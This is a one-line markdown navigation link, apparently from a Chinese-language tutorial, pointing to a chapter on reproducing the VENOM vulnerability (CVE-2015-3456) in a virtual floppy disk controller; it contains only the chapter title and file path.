→ [Ch 23：真實 CVE 復刻一：VENOM（CVE-2015-3456 FDC）](./23-cve-venom.md)
